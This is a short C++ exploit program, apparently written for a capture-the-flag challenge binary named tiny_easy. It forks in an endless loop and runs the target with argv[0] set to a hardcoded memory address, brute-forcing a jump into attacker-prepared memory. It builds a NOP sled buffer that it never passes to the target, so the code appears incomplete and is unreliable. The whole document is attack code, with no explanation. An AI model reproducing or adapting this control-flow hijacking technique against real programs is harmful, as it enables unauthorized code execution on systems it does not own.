#include <unistd.h>
#include <iostream>
#include <cstring>
#include <sys/types.h>
#include <sys/wait.h>

using namespace std;

main()
{
char address[]= "\x40\x66\x94\xff";
char nopsled[1000]="";
memset(nopsled, '\x90', 500);
int status=0;
pid_t child_pid, wpid;

while (1){


        int child_pid = fork();
        if (child_pid==0) {
                execl("/home/tiny_easy/tiny_easy", address,  (char *) 0);
                }
                while ((wpid = wait(&status)) > 0);
           }
}
